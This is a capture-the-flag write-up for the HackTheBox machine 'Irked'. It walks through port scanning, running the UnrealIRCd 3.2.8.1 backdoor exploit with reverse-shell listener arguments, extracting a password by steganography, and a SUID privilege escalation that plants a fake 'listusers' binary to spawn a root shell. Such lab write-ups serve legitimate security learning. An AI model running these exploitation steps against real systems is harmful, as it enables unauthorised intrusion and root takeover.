# HackTheBox - Irked

## Reconnaissance

Add machine IP to the `hosts` file.

![[HackTheBox/Irked/images/1.png]]

Conduct a port scan against `irked.htb`:

```bash
sudo nmap -sV -p- --max-rate 10000 irked.htb
```

![[HackTheBox/Irked/images/2.png]]

Well, I'll check the web server directly ->

I don't have background knowledge about `IRC`. That is why, let's check.

![[HackTheBox/Irked/images/3.png]]

> ***[IRC](https://en.wikipedia.org/wiki/IRC)** (**Internet Relay Chat**) is a text-based chat system for [instant messaging](https://en.wikipedia.org/wiki/Instant_messaging "Instant messaging").*

---

## Enumeration

Conducting a fuzzing operation ->

```bash
dirb http://irked.htb
```

![[HackTheBox/Irked/images/4.png]]

```bash
dirsearch -u http://irked.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![[HackTheBox/Irked/images/5.png]]

Poor results, let's give a second shot to the port scanning results.

`rpcbind 2-4 (RPC #100000)` did not have an exploit.

`rpcbind` demonstrated that only three exploits straightforwardly causing disruption of service.

```bash
searchsploit "rpcbind"
```

![[HackTheBox/Irked/images/6.png]]

```bash
searchsploit "UnrealIRCd"
```

![[HackTheBox/Irked/images/7.png]]

---

## Exploitation

I don't use `msf` exploits anymore because of my preparation for OSCP. In order to access the machine, use the first and third one as an exploit.

[Unreal IRCD version 3.2.8.1 remote command execution exploit.](https://gist.github.com/tylur/50cee76a225c1fc3c96f952f90e1136a)

I faced a simple issue while I was executing the exploit:

![[HackTheBox/Irked/images/9.png]]

```
print "!#@#@! h4ck1ng is just Unreal #@!#%%\n"
```

The highlighted section is leading to an error, so I'll change the Python version or refactor the code to be compatible with `python3`.

![[HackTheBox/Irked/images/8.png]]

I found another one that works great.

[UnrealRCE](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py)

Alter IP and port positions accordingly.

![[HackTheBox/Irked/images/10.png]]

6697, 8067 were assigned for IRC.

```bash
└─# python irc.py 10.129.7.101 6697 -payload bash
^CTraceback (most recent call last):
  File "/home/kali/Desktop/irc.py", line 54, in <module>
    data = s.recv(1024)
KeyboardInterrupt
```

The exploit did not want to wait for the connection. I discovered a readme file ->

[RCE](https://github.com/kevinpdicks/UnrealIRCD-3.2.8.1-RCE)

The guy is referring to an exploit from a ProvingGrounds machine called `SunsetNoontide`.

Then I found the writeup of the machine from ->

https://cyberarri.com/2024/03/30/sunset-noontide-redo-pg-play-writeup/

The guy mentions the exploit:

https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution/blob/main/script.py

```bash
python3 script.py <target> <tport> <listener> <lport>
```

I could not get a reverse shell, it stucks. I shifted my approach to `msfconsole`.

Use -> https://khadkadevraj100.medium.com/exploiting-vulnerability-unreal-ircd-backdoor-6c8f35a0111c

```bash
msfconsole
search "unreal"
use 5
```

![[HackTheBox/Irked/images/11.png]]

```bash
show options
set RHOSTS 10.129.7.101
set CHOST 10.10.16.64
set CPORT 4444
```

I got a payload selection error.

```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[-] 10.129.7.101:8067 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf exploit(unix/irc/unreal_ircd_3281_backdoor) >
```

```bash
show payloads
set PAYLOAD 8
```

![[HackTheBox/Irked/images/12.png]]

The exploit did not work on `6697`, so I decided to reset the machine and move to the manual exploit again.

https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution/blob/main/script.py

```bash
python3 script.py 10.129.7.169 8067 10.10.16.64 3000
```

![[HackTheBox/Irked/images/13.png]]

---

## Shell Upgrade

```bash
which python
/usr/bin/python
which python2
/usr/bin/python2
which python3
/usr/bin/python3
```

We have full Python binaries available. Therefore, try to upgrade the shell:

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

Use `python -c 'import pty; pty.spawn("/bin/bash")'`

![[HackTheBox/Irked/images/14.png]]

---

## User Flag

`sudo` binary was not assigned, so I'll ask HackTricks to conduct light enumeration.

I did not get the `user` flag.

![[HackTheBox/Irked/images/15.png]]

I decided to manually check every directory in the user's assets.

![[HackTheBox/Irked/images/16.png]]

The clue is clear, let's run `steghide`:

Use it -> https://github.com/cyb0rgdoll/image-steg

```bash
steghide extract -sf irked.jpg
```

![[HackTheBox/Irked/images/17.png]]

User pass is ready!

`djmardov:Kab6h+m+bbp2J:HG`

```bash
ircd@irked:/home/djmardov/Documents$ su djmardov
su djmardov
Password: Kab6h+m+bbp2J:HG

djmardov@irked:~/Documents$
```

Get the user flag:

![[HackTheBox/Irked/images/18.png]]

---

## Privilege Escalation

Not possible to run the `sudo` binary.

![[HackTheBox/Irked/images/19.png]]

I'll shift to `capabilities` & `SUID`.

```bash
strings /usr/bin/viewuser
```

Check the binary source code. The script uses `setuid`, `system`, and great hints about where it tests user permissions.

![[HackTheBox/Irked/images/20.png]]

![[HackTheBox/Irked/images/21.png]]

There was no file named `listusers`. Hence, I created mine.

```bash
# we don't have sudo itself
echo "/bin/bash" > /tmp/listusers
chmod +x listusers
/usr/bin/viewuser
```

![[HackTheBox/Irked/images/22.png]]

## Root Flag

No `sudo` binary available in the case:

```bash
root@irked:/tmp# which sudo
which sudo
root@irked:/tmp#
```

Get the root flag from the root directory ->

![[HackTheBox/Irked/images/23.png]]
